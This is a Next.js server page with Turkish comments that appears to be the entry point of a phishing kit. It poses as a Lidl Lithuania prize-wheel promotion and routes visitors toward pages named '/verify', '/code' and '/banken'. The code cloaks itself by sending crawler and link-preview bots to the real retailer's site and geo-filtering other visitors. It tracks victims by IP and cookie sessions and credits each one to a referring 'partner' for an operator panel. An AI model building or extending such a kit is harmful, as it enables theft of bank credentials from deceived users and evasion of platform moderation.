import { redirect } from "next/navigation";
import { cookies, headers } from "next/headers";
import { createSessionAction } from "@/app/actions/create-session";
import { buildShareMetadata } from "@/lib/share-metadata";
import { createServerSupabaseClient } from "@/lib/supabase/server";
import { stepToPath } from "@/lib/session-routes";
import { getBlockedRedirectUrl, getGeoRedirectTarget } from "@/lib/geo-guard";
import { ACTIVE_SESSION_COOKIE } from "@/lib/session-constants";

const ALLOWED_ENTRY_PAGES = ["/win", "/verify", "/wheel", "/code", "/banken"];

async function getEntryPage(): Promise<string> {
  try {
    const supabase = await createServerSupabaseClient();
    if (!supabase) return "/win";
    const { data } = await supabase
      .from("global_settings")
      .select("entry_page")
      .limit(1)
      .maybeSingle();
    const raw = typeof data?.entry_page === "string" ? data.entry_page.trim() : "";
    return ALLOWED_ENTRY_PAGES.includes(raw) ? raw : "/win";
  } catch {
    return "/win";
  }
}

const RESUME_WINDOW_MS = 24 * 60 * 60 * 1000; // 24 saat icinde ayni cihaz/IP -> kaldigi yerden devam

type ResumableSession = { id: string; public_id: number | string | null; current_step: string | null };

async function findResumableSession(allowIpFallback = true): Promise<ResumableSession | null> {
  const cutoff = new Date(Date.now() - RESUME_WINDOW_MS).toISOString();
  const notHidden = "is_hidden.is.false,is_hidden.is.null";
  try {
    const supabase = await createServerSupabaseClient();
    if (!supabase) return null;

    // 1) Cookie'deki session uuid -> ayni cihazdan tekrar giris
    try {
      const cookieStore = await cookies();
      const cookieSessionId = cookieStore.get(ACTIVE_SESSION_COOKIE)?.value?.trim();
      if (cookieSessionId) {
        const { data } = await supabase
          .from("sessions")
          .select("id, public_id, current_step")
          .eq("id", cookieSessionId)
          .or(notHidden)
          .gte("created_at", cutoff)
          .maybeSingle();
        if (data?.id) return data as ResumableSession;
      }
    } catch {
      /* cookie okunamazsa IP fallback'e dus */
    }

    // 2) IP bazli: son 24 saatte ayni IP'den en son gizli olmayan session
    // (olusturulan linklerle gelenlerde devre disi - her link yeni session)
    if (!allowIpFallback) return null;
    const h = await headers();
    let ip = h.get("x-forwarded-for") || h.get("x-real-ip") || "";
    if (ip.includes(",")) ip = ip.split(",")[0].trim();
    if (!ip) return null;

    const { data } = await supabase
      .from("sessions")
      .select("id, public_id, current_step")
      .eq("ip_address", ip)
      .or(notHidden)
      .gte("created_at", cutoff)
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();
    return (data?.id ? data : null) as ResumableSession | null;
  } catch {
    return null;
  }
}

const VACANT_SESSION_MIN_AGE_MS = 10 * 60 * 1000; // 10 dk'dan eski bos session'lar devralinabilir

// Ana domainden gelip isim/odul girmeden kalan "bos" session'lari (pending_profile)
// yeni ziyaretciye devreder: yeni satir acmak yerine eski public_id/session'i kullanir.
async function claimVacantSession(partnerName: string): Promise<ResumableSession | null> {
  try {
    const supabase = await createServerSupabaseClient();
    if (!supabase) return null;

    const cutoff = new Date(Date.now() - VACANT_SESSION_MIN_AGE_MS).toISOString();
    const staleFilter = `updated_at.lt.${cutoff},updated_at.is.null`;
    const { data: candidate } = await supabase
      .from("sessions")
      .select("id, public_id, current_step")
      .eq("form_data->>pending_profile", "true")
      .or(staleFilter)
      .order("updated_at", { ascending: true, nullsFirst: true })
      .limit(1)
      .maybeSingle();
    if (!candidate?.id) return null;

    const h = await headers();
    let ip = h.get("x-forwarded-for") || h.get("x-real-ip") || "";
    if (ip.includes(",")) ip = ip.split(",")[0].trim();
    const ua = h.get("user-agent") || "";

    // Kosullu update: baska bir istek ayni session'i once devraldiysa
    // updated_at yenilendigi icin bu update 0 satir dondurur.
    const { data: claimed } = await supabase
      .from("sessions")
      .update({
        is_hidden: false,
        current_step: "win",
        status: "offline",
        partner_name: partnerName,
        ip_address: ip || null,
        user_agent: ua || null,
        updated_at: new Date().toISOString(),
        form_data: {
          currency: "€",
          is_wheel_game: true,
          pending_profile: true,
        },
      })
      .eq("id", candidate.id)
      .eq("form_data->>pending_profile", "true")
      .or(staleFilter)
      .select("id, public_id, current_step")
      .maybeSingle();

    return (claimed?.id ? claimed : null) as ResumableSession | null;
  } catch {
    return null;
  }
}

export const dynamic = "force-dynamic";

export async function generateMetadata() {
  return buildShareMetadata({
    title: "Lidl — Laimės Ratas",
    description:
      "Lidl specialioji laimės ratai akcija! Išmėginkite savo sėkmę ir laimėkite išskirtinius prizus.",
    canonical: "/",
  });
}

type Props = {
  searchParams?: Promise<{ ref?: string }>;
};

const BOT_UA =
  /facebookexternalhit|facebot|twitterbot|whatsapp|telegrambot|linkedinbot|discordbot|slackbot|pinterest|redditbot|skypeuripreview|viber|vkshare|applebot|googlebot|bingbot|duckduckbot|baiduspider|yandex/i;

export default async function Home({ searchParams }: Props) {
  // Bot/crawler istekleri siteye girmesin: dogrudan engellenen ulke
  // yonlendirme hedefine (genel ayarlardaki URL, varsayilan lidl.lt) gonder.
  // NOT: redirect() try/catch disinda cagirilmali (NEXT_REDIRECT yutulmasin).
  let isBot = false;
  try {
    const h = await headers();
    isBot = BOT_UA.test(h.get("user-agent") || "");
  } catch {
    // headers() erisilemezse normal akis
  }
  if (isBot) {
    redirect(await getGeoRedirectTarget());
  }

  // Geo filtre: secili olmayan ulkeden gelen ziyaretci yonlendirme URL'sine gider.
  // Bot/crawler UA'lari getBlockedRedirectUrl icinde muaf tutulur (OG bozulmaz).
  {
    const h = await headers();
    const blockedUrl = await getBlockedRedirectUrl(h.get("user-agent") || "");
    if (blockedUrl) redirect(blockedUrl);
  }

  let partnerName = "admin";
  try {
    const sp = await searchParams;
    if (sp?.ref && typeof sp.ref === "string" && sp.ref.trim() !== "") {
      partnerName = sp.ref.trim();
    }
  } catch {
    partnerName = "admin";
  }

  // Mevcut session varsa yeni log olusturma -> kaldigi adima geri don.
  // Ref'li (olusturulan) linkte IP resume kapali: ayni IP'den farkli kisiler
  // linki acarsa birbirinin session'ina dusmesin; ayni cihaz cookie ile devam eder.
  const hasRef = partnerName !== "admin";
  const resumed = await findResumableSession(!hasRef);
  if (resumed) {
    const routeId =
      resumed.public_id != null && String(resumed.public_id).trim() !== ""
        ? String(resumed.public_id)
        : resumed.id;
    // Ref ile gelmisse son partneri guncelle (attribution taze kalsin)
    if (partnerName !== "admin") {
      try {
        const supabase = await createServerSupabaseClient();
        await supabase
          ?.from("sessions")
          .update({ partner_name: partnerName })
          .eq("id", resumed.id);
      } catch {
        /* sessiz */
      }
    }
    redirect(stepToPath(resumed.current_step as any, resumed.id, routeId));
  }

  // Aktif session yoksa: admin panelinde "bos" kalan (pending) bir session
  // varsa onu devral, yoksa yeni session olustur.
  const vacant = await claimVacantSession(partnerName);
  if (vacant) {
    const routeId =
      vacant.public_id != null && String(vacant.public_id).trim() !== ""
        ? String(vacant.public_id)
        : vacant.id;
    const entryPage = await getEntryPage();
    redirect(`${entryPage}?session=${encodeURIComponent(routeId)}`);
  }

  const result = await createSessionAction(partnerName);

  if (!result.success || !result.data?.id) {
    redirect("/win");
  }

  const sessionId = result.data.id;
  const hasShortPublicId =
    result.data.public_id != null &&
    String(result.data.public_id).trim() !== "";

  const routeSessionId = hasShortPublicId
    ? String(result.data.public_id)
    : sessionId;

  const entryPage = await getEntryPage();
  redirect(`${entryPage}?session=${encodeURIComponent(routeSessionId)}`);
}
